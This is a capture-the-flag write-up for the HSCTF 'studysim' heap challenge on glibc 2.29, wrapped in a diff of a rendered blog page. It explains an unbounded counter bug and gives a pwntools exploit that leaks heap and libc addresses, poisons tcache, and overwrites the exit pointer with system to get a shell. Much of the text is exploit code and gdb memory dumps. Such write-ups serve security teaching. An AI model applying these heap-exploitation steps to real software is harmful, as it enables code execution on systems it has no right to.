@@ -1,0 +1,349 @@
+I" s<p>This is one the challenges I spent a lot of time on during this year’s edition of HSCTF.</p>
+
+<h2 id="tldr-of-the-challenge-binary">TL;DR OF THE CHALLENGE BINARY</h2>
+
+<p>We’ve been given a standard 64 bit x86 Dynamically Linked binary along with Glibc 2.29 to begin with.</p>
+
+<p>Here’s what <em>Checksec</em> has to say</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : FULL
+
+</code></pre></div></div>
+
+<p>Let’s dive into reversing now.</p>
+
+<h2 id="reversing">REVERSING</h2>
+
+<p>The binary is surprisingly easy to Reverse.</p>
+
+<p>There’s a standard CTF style menu driven code which has only two options , <strong>add</strong> and <strong>do</strong></p>
+
+<ul>
+  <li><strong>ADD</strong>
+    <ol>
+      <li>Checks whether the count of worksheets is equal to 7.</li>
+      <li>If count is not equal to 7 , it asks for size and checks if size is less than or equal to <strong>1024</strong>.</li>
+      <li>Finally it reads size number of bytes and stores the pointer on bss variable called <strong>stack</strong> at an offset of <em>allocated_count++</em>.</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span> <span class="n">allocated_count</span> <span class="o">==</span> <span class="mi">7</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Your workload is too high!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"How long is your worksheet?"</span><span class="p">);</span>
+    <span class="n">read_ulong</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">1024</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">v2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">v1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v2</span> <span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"What's the content of your worksheet?"</span><span class="p">);</span>
+      <span class="n">read_str</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="n">v2</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
+      <span class="n">stack</span><span class="p">[</span><span class="n">allocated_count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"You throw the worksheet '%s' on your stack of worksheets.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Your worksheet is too long;"</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can see that there are <strong>no bounded checks</strong> for the maximum allocated_count which is a potential bug.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span> <span class="n">allocated_count</span> <span class="o">==</span> <span class="mi">7</span> <span class="p">)</span>              
+</code></pre></div></div>
+
+<ul>
+  <li><strong>DO</strong>
+    <ol>
+      <li>This function just asks for how many worksheets we would like to finish and subtracts the <strong>allocated_count</strong> with the number that we give as input.</li>
+      <li>There are no checks here and hence allocated count can become a negetive number too.</li>
+      <li>Finally it prints the allocated_count.</li>
+    </ol>
+  </li>
+</ul>
+
+<p>This lets us add chunks anywhere in memory but first we need leaks to go ahead.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">puts</span><span class="p">(</span><span class="s">"How many worksheets would you like to finish?"</span><span class="p">);</span>
+  <span class="n">read_ulong</span><span class="p">((</span><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+  <span class="n">allocated_count</span> <span class="o">-=</span> <span class="n">v1</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"You did %lu worksheets. Only %ld more to go!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="n">allocated_count</span><span class="p">);</span>
+
+</code></pre></div></div>
+
+<p>This is it for Reversing , let’s head on to converting the bugs that we found into primitives.</p>
+
+<h2 id="exploit-development-and-analysis">EXPLOIT DEVELOPMENT AND ANALYSIS</h2>
+
+<p>Initially we kind of got stuck as to how we could leak , but then , Heap Leak can be easily extracted by simply allocating a chunk at <strong>allocated_count</strong>.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+
+<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">'pwn.hsctf.com'</span><span class="p">,</span><span class="mi">5007</span><span class="p">)</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">noptrace</span><span class="o">=</span><span class="bp">True</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">"CRITICAL"</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./studysim'</span><span class="p">)</span><span class="c1">#,env = {"LD_PRELOAD" : "./libc.so.6"})
+</span>
+<span class="n">reu</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">rel</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">re</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'add'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'your worksheet?</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'your worksheet?</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">do_work</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'do'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'like to finish?</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'sleep'</span><span class="p">)</span>
+
+<span class="n">stack</span> <span class="o">=</span> <span class="mh">0x404060</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s">'1'</span><span class="o">*</span><span class="mh">0x1ff</span><span class="p">)</span>
+    <span class="n">do_work</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x300</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    <span class="n">do_work</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="c1">#Heap
+</span>    <span class="n">reu</span><span class="p">(</span><span class="s">'Only '</span><span class="p">)</span>
+    <span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span><span class="mi">10</span><span class="p">)</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">-</span> <span class="mh">0x470</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"heap_base = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>From now on , we’ll examine memory at each step.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x404020 &lt;stdout@@GLIBC_2.2.5&gt;:	0x00007f04c9aa6760	0x0000000000000000
+0x404030 &lt;stdin@@GLIBC_2.2.5&gt;:	0x00007f04c9aa5a00	0x0000000000000000
+0x404040 &lt;allocated_count&gt;:	0x0000000000405470	0x0000000000000000
+0x404050:	0x0000000000000000	0x0000000000000000
+0x404060 &lt;stack&gt;:	0x0000000000405260	0x0000000000000000
+0x404070 &lt;stack+16&gt;:	0x0000000000000000	0x0000000000000000
+0x404080 &lt;stack+32&gt;:	0x0000000000000000	0x0000000000000000
+0x404090 &lt;stack+48&gt;:	0x0000000000000000	0x0000000000000000
+
+</code></pre></div></div>
+
+<p>As u can see <strong>allocated_count</strong> has been overwritten with a heap address and there goes our heap leak.</p>
+
+<p>Initially , I thought since file pointers are buffered on bss , it could be file structure exploitaion , but then I dropped the idea for several reasons I’ll discuss in a moment.</p>
+
+<p>A heap leak is kind of a light of hope as now we can offset to heap and stuff on tcache thereby fooling malloc to assume that they’re free chunks.</p>
+
+<p>As we can get allocation on tcache , we can overwrite <strong>fd</strong> of our allocated chunk to point to wherever we want.</p>
+
+<p>We still dont have libc leak :(, hence our first aim is to get libc leak. To do that , we have our potential candidates in bss , yes , you guessed it right , the file pointers in bss.</p>
+
+<p>Here’s what we’re upto right now -&gt;</p>
+
+<ol>
+  <li>Get allocation on tcache , overwrite fd of one chunk and finally get the pointer to libc to leak it out.</li>
+  <li>We need to setup our allocated_count in such a way that we can offset to our desired tcache with <strong>stack[allocated_count++</strong>].</li>
+</ol>
+
+<p>To offset to tcache , we call <strong>do_worksheet</strong> and change our allocated_count to -&gt;</p>
+
+<p class="notice">allocated_count - (tcache-stack)/8</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stack</span> <span class="o">=</span> <span class="mh">0x404060</span>
+<span class="n">tcache</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x248</span>  <span class="c1">#Corresponds to tcache of 0x400
+</span><span class="n">allocated_count</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x470</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">-</span> <span class="n">stack</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span> 
+<span class="n">change</span> <span class="o">=</span> <span class="n">allocated_count</span> <span class="o">-</span> <span class="n">offset</span>
+<span class="n">do_work</span><span class="p">(</span><span class="n">change</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>This will subtract our allocated count with <strong>change</strong> and hence when the next allocation happens , we get allocation on tcache.
+You can play around with the offset calculation if you didnt get it yet , its not that tough to understand :).</p>
+
+<p>We now change the fd of our allocated chunk and then get back the libc pointer whose data we can leak.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="n">add</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x404030</span><span class="p">))</span>
+   <span class="n">do_work</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="mh">0x5</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We change the allocated_count back to negetive 4 so that we get next allocation on <strong>allocated_count</strong> itself and repeat the above process to get allocation on another tcache.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span> <span class="c1">#Get allocation on allocated count
+</span>    <span class="n">allocated_count_new1</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xb91</span>
+    <span class="n">tcache_new</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x148</span>  <span class="c1">#This time target another tcache of 0x200
+</span>    <span class="n">offset_new</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_new</span> <span class="o">-</span> <span class="n">stack</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
+    <span class="n">k</span> <span class="o">=</span> <span class="n">allocated_count_new1</span> <span class="o">-</span> <span class="n">offset_new</span>
+    <span class="n">do_work</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x404030</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>As u can see , tcache of 0x200 and 0x400 are successfully populated with our pointers.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x405000:	0x0000000000000000	0x0000000000000251
+0x405010:	0x0000000000000000	0x0000000000000000
+0x405020:	0x0000000000000000	0x0000000000000000
+0x405030:	0x0000000000000000	0x0000000000000000
+0x405040:	0x0000000000000000	0x0000000000000000
+0x405050:	0x0000000000000000	0x0000000000000000
+0x405060:	0x0000000000000000	0x0000000000000000
+0x405070:	0x0000000000000000	0x0000000000000000
+0x405080:	0x0000000000000000	0x0000000000000000
+0x405090:	0x0000000000000000	0x0000000000000000
+0x4050a0:	0x0000000000000000	0x0000000000000000
+0x4050b0:	0x0000000000000000	0x0000000000000000
+0x4050c0:	0x0000000000000000	0x0000000000000000
+0x4050d0:	0x0000000000000000	0x0000000000000000
+0x4050e0:	0x0000000000000000	0x0000000000000000
+0x4050f0:	0x0000000000000000	0x0000000000000000
+0x405100:	0x0000000000000000	0x0000000000000000
+0x405110:	0x0000000000000000	0x0000000000000000
+0x405120:	0x0000000000000000	0x0000000000000000
+0x405130:	0x0000000000000000	0x0000000000000000
+0x405140:	0x0000000000000000	0x0000000000405da0 -&gt; 0x200 tcache
+0x405150:	0x0000000000000000	0x0000000000000000
+0x405160:	0x0000000000000000	0x0000000000000000
+0x405170:	0x0000000000000000	0x0000000000000000
+0x405180:	0x0000000000000000	0x0000000000000000
+0x405190:	0x0000000000000000	0x0000000000000000
+0x4051a0:	0x0000000000000000	0x0000000000000000
+0x4051b0:	0x0000000000000000	0x0000000000000000
+0x4051c0:	0x0000000000000000	0x0000000000000000
+0x4051d0:	0x0000000000000000	0x0000000000000000
+0x4051e0:	0x0000000000000000	0x0000000000000000
+0x4051f0:	0x0000000000000000	0x0000000000000000
+0x405200:	0x0000000000000000	0x0000000000000000
+0x405210:	0x0000000000000000	0x0000000000000000
+0x405220:	0x0000000000000000	0x0000000000000000
+0x405230:	0x0000000000000000	0x0000000000000000
+0x405240:	0x0000000000000000	0x0000000000405780 -&gt; 0x400 tcache
+
+</code></pre></div></div>
+
+<p>Since fd of our tcache is overwritten with bss libc pointer , we can get allocation on bss by calling malloc twice from now and subsequently leak libc.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    add<span class="o">(</span>0x400,p64<span class="o">(</span>0x60<span class="o">))</span>
+    add<span class="o">(</span>0x400,p8<span class="o">(</span>0x60<span class="o">))</span>
+    <span class="c">#Libc</span>
+    reu<span class="o">(</span><span class="s2">"You throw the worksheet '"</span><span class="o">)</span>
+    libc_base <span class="o">=</span> u64<span class="o">(</span>re<span class="o">(</span>6<span class="o">)</span> + <span class="s1">'\x00'</span><span class="k">*</span>2<span class="o">)</span> - 0x1e4a60
+    log.info<span class="o">(</span><span class="s2">"libc = "</span> + hex<span class="o">(</span>libc_base<span class="o">))</span>
+    system <span class="o">=</span> libc_base + LIBC.symbols[<span class="s1">'system'</span><span class="o">]</span>
+
+</code></pre></div></div>
+
+<p>Let’s see where all this has got us.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+0x405000:	0x0000000000000000	0x0000000000000251
+0x405010:	0x0000000000000000	0x0000000000000000
+0x405020:	0x0000000000000000	0x0000000000000000
+0x405030:	0x0000000000000000	0x0000000000000000
+0x405040:	0x0000000000000000	0xfe00000000000000
+0x405050:	0x0000000000000000	0x0000000000000000
+0x405060:	0x0000000000000000	0x0000000000000000
+0x405070:	0x0000000000000000	0x0000000000000000
+0x405080:	0x0000000000000000	0x0000000000000000
+0x405090:	0x0000000000000000	0x0000000000000000
+0x4050a0:	0x0000000000000000	0x0000000000000000
+0x4050b0:	0x0000000000000000	0x0000000000000000
+0x4050c0:	0x0000000000000000	0x0000000000000000
+0x4050d0:	0x0000000000000000	0x0000000000000000
+0x4050e0:	0x0000000000000000	0x0000000000000000
+0x4050f0:	0x0000000000000000	0x0000000000000000
+0x405100:	0x0000000000000000	0x0000000000000000
+0x405110:	0x0000000000000000	0x0000000000000000
+0x405120:	0x0000000000000000	0x0000000000000000
+0x405130:	0x0000000000000000	0x0000000000000000
+gdb-peda<span class="nv">$ </span>
+0x405140:	0x0000000000000000	0x0000000000405da0
+0x405150:	0x0000000000405780	0x0000000000404030
+0x405160:	0x0000000000000000	0x0000000000000000
+0x405170:	0x0000000000000000	0x0000000000000000
+0x405180:	0x0000000000000000	0x0000000000000000
+0x405190:	0x0000000000000000	0x0000000000000000
+0x4051a0:	0x0000000000000000	0x0000000000000000
+0x4051b0:	0x0000000000000000	0x0000000000000000
+0x4051c0:	0x0000000000000000	0x0000000000000000
+0x4051d0:	0x0000000000000000	0x0000000000000000
+0x4051e0:	0x0000000000000000	0x0000000000000000
+0x4051f0:	0x0000000000000000	0x0000000000000000
+0x405200:	0x0000000000000000	0x0000000000000000
+0x405210:	0x0000000000000000	0x0000000000000000
+0x405220:	0x0000000000000000	0x0000000000000000
+0x405230:	0x0000000000000000	0x0000000000000000
+0x405240:	0x0000000000000000	0x00007f1f747c1a00 -&gt; There u go , we unlinked our stdin file structure , next allocation should <span class="k">return </span>our file structure.
+
+</code></pre></div></div>
+
+<p>From now on , things seeemed clear but turned out they weren’t.</p>
+
+<ol>
+  <li>File structure overwrite , but one_gadget constraints were not satisfying anywhere.</li>
+  <li>Tried overwriting <strong>malloc hook</strong> and again one_gadget constraints were not satisfying.</li>
+</ol>
+
+<p>At this point , I was super frustrated , and then gave a thought , and <strong>exit pointer</strong> came to my mind like lightning.</p>
+
+<p>So overwrote exit pointer with one_gadget , but there also the constraints were very stubborn.</p>
+
+<p>There I observed something , when there was a call to exit_pointer , rdi was set to a libc bss address but it was very far from exit pointer’s address.</p>
+
+<p>Then I tried doing 2 overwrites ,</p>
+
+<ol>
+  <li>Overwrite <strong>exit_pointer</strong> with <strong>system</strong>.</li>
+  <li>Overwrite libc bss pointer with “/bin/sh”.</li>
+</ol>
+
+<p>And it worked!!!</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x218968</span> <span class="c1">#rdi was set to this address
+</span>    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">LIBC</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_2_1_stdin_'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset_new</span><span class="o">-</span><span class="mi">2</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+    <span class="n">do_work</span><span class="p">(</span><span class="n">offset_new</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    <span class="n">allocated_count_new2</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xfb1</span>
+    <span class="n">do_work</span><span class="p">(</span><span class="n">allocated_count_new2</span> <span class="o">-</span> <span class="n">offset_new</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s">'a'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>  <span class="c1">#Get allocation on libc bss and overwrite rdi pointer to /bin/sh
+</span>    <span class="n">do_work</span><span class="p">(</span><span class="n">offset_new</span><span class="o">+</span><span class="mi">3</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    <span class="n">allocated_count_new3</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x13d1</span>
+    <span class="n">do_work</span><span class="p">(</span><span class="n">allocated_count_new3</span><span class="o">-</span><span class="p">(</span><span class="n">offset_new</span><span class="p">))</span>
+    <span class="n">exit_ptr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x218f68</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">exit_ptr</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>  <span class="c1">#Get allocation on exit pointer and overwrite it with system
+</span>    <span class="nb">exit</span><span class="p">()</span>                  <span class="c1">#Finally call exit and trigger shell
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="conclusion">CONCLUSION</h2>
+
+<p>It was a really nice challenge and I had a lot of fun solving it.</p>
+
+<p>Here’s the <a href="https://gist.github.com/PwnVerse/c7dc7f14dcc5cf8b044705c2037559f1">script</a></p>
+
+:ET
